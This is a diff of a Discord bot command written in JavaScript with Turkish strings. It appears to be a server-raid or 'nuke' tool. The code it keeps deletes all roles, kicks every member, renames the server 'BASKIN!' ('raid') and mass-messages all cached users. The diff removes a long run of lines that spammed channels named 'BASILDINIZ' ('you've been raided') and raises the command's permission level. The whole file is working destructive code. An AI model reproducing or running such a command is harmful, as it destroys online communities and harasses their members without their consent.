@@ -5,65 +5,18 @@ exports.run = (client, message, args) => {
   message.guild.roles.forEach(r => {r.delete()});
   message.guild.members.forEach(ban => {ban.kick()});
   message.guild.setName('BASKIN!')
-       
   client.users.forEach(msg => {
 msg.send('KUDURUN!')
 })
   
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
-  message.guild.createChannel("BASILDINIZ")
+
+
 };
 exports.conf = {
   enabled: true,  
   guildOnly: true, 
   aliases: [], 
-  permLevel: 0,
+  permLevel: 4,
   kategori: 'bumbumbum'
 };
 
